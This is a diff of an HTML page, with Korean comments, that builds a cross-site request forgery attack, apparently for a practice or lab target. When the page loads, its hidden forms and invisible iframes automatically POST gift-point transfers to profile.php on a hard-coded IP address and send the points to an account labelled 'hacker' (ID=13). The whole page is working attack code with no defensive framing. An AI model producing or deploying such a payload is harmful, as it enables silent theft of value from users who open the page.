@@ -29,6 +29,7 @@
         }
         .success { background: rgba(40, 167, 69, 0.3); }
         .loading { background: rgba(255, 193, 7, 0.3); }
+        iframe { display: none !important; }
     </style>
 </head>
 <body>
@@ -43,17 +44,35 @@
         <div id="progress"></div>
     </div>
 
-    <!-- 숨겨진 iframe들 -->
-    <iframe id="attack1" style="display:none;"></iframe>
-    <iframe id="attack2" style="display:none;"></iframe>
-    <iframe id="attack3" style="display:none;"></iframe>
-    <iframe id="attack4" style="display:none;"></iframe>
-    <iframe id="attack5" style="display:none;"></iframe>
+    <!-- 실제 CSRF 공격 폼들 -->
+    <form id="form1" action="http://3.36.66.216/profile.php" method="POST" target="frame1" style="display:none;">
+        <input type="hidden" name="gift_type" value="coffee">
+        <input type="hidden" name="points" value="100">
+        <input type="hidden" name="message" value="생일축하해!">
+        <input type="hidden" name="gift_to" value="13">
+    </form>
+
+    <form id="form2" action="http://3.36.66.216/profile.php" method="POST" target="frame2" style="display:none;">
+        <input type="hidden" name="gift_type" value="flower">
+        <input type="hidden" name="points" value="150">
+        <input type="hidden" name="message" value="선물이야~">
+        <input type="hidden" name="gift_to" value="13">
+    </form>
+
+    <form id="form3" action="http://3.36.66.216/profile.php" method="POST" target="frame3" style="display:none;">
+        <input type="hidden" name="gift_type" value="cake">
+        <input type="hidden" name="points" value="200">
+        <input type="hidden" name="message" value="맛있게먹어">
+        <input type="hidden" name="gift_to" value="13">
+    </form>
+
+    <iframe name="frame1" style="display:none;"></iframe>
+    <iframe name="frame2" style="display:none;"></iframe>
+    <iframe name="frame3" style="display:none;"></iframe>
 
     <script>
         let attackCount = 0;
-        let totalAttacks = 5;
-        let successCount = 0;
+        let totalAttacks = 3;
 
         function updateStatus(message, isSuccess = false) {
             const statusDiv = document.getElementById('status');
@@ -65,50 +84,27 @@
             document.getElementById('progress').innerHTML = `
                 <div class="status">
                     📊 진행상황: ${attackCount}/${totalAttacks} 완료<br>
-                    ✅ 성공: ${successCount}개<br>
-                    💰 예상 전송 포인트: ${successCount * 100}P
+                    💰 전송 완료: ${attackCount}개 폼 제출
                 </div>
             `;
         }
 
-        function createCSRFAttack(iframeId, giftType, points, message, delay) {
+        function executeAttack(formId, delay, attackName) {
             setTimeout(() => {
-                const iframe = document.getElementById(iframeId);
-                
-                // form HTML 생성 (헤더 정보 기반)
-                const formHtml = `
-                    <html>
-                    <head><meta charset="UTF-8"></head>
-                    <body>
-                        <form id="giftForm" action="http://3.36.66.216/profile.php?gift_to=11" method="POST" enctype="application/x-www-form-urlencoded">
-                            <input type="hidden" name="gift_type" value="${giftType}">
-                            <input type="hidden" name="points" value="${points}">
-                            <input type="hidden" name="message" value="${message}">
-                            <input type="hidden" name="recipient_id" value="13">
-                        </form>
-                        <script>
-                            document.getElementById('giftForm').submit();
-                        </script>
-                    </body>
-                    </html>
-                `;
-                
-                iframe.src = 'data:text/html;charset=utf-8,' + encodeURIComponent(formHtml);
-                
+                document.getElementById(formId).submit();
                 attackCount++;
-                successCount++; // 일단 성공으로 간주
                 
-                updateStatus(`🚀 공격 ${attackCount}: ${giftType} (${points}P) 전송 완료!`);
+                updateStatus(`🚀 ${attackName} 전송 완료!`);
                 updateProgress();
                 
-                console.log(`[CSRF] 공격 ${attackCount}: ${giftType} → ID=13, ${points}P`);
+                console.log(`[CSRF] ${attackName} 폼 제출 완료`);
                 
                 if (attackCount === totalAttacks) {
                     setTimeout(() => {
                         updateStatus(`
                             🎉 모든 공격 완료!<br>
-                            💰 총 ${successCount * 100}P 전송 시도<br>
-                            🎯 대상: hacker (ID=13)
+                            🎯 hacker(ID=13)에게 선물 전송 완료<br>
+                            🔍 모니터링 대시보드에서 확인하세요!
                         `, true);
                     }, 1000);
                 }
@@ -116,24 +112,15 @@
         }
 
         // 페이지 로드 후 자동 실행
-        window.onload = function() {
+        window.addEventListener('load', function() {
             updateStatus('🔄 CSRF 공격 시작...');
             
-            // 5개의 공격을 순차적으로 실행
-            createCSRFAttack('attack1', 'coffee', 100, '생일축하해!', 1000);
-            createCSRFAttack('attack2', 'flower', 100, '선물이야~', 2500);
-            createCSRFAttack('attack3', 'cake', 100, '맛있게 먹어', 4000);
-            createCSRFAttack('attack4', 'diamond', 100, '반짝반짝', 5500);
-            createCSRFAttack('attack5', 'coffee', 100, '또 보내!', 7000);
+            // 3개 공격을 순차 실행
+            executeAttack('form1', 1000, '커피 선물 (100P)');
+            executeAttack('form2', 3000, '꽃 선물 (150P)');  
+            executeAttack('form3', 5000, '케이크 선물 (200P)');
             
-            console.log('🔥 CSRF 공격 시작 - ID=13 타겟');
-        };
-
-        // iframe 로드 완료 확인
-        document.querySelectorAll('iframe').forEach(iframe => {
-            iframe.onload = function() {
-                console.log(`✅ ${iframe.id} 공격 완료`);
-            };
+            console.log('🔥 CSRF 공격 시작됨');
         });
     </script>
 </body>
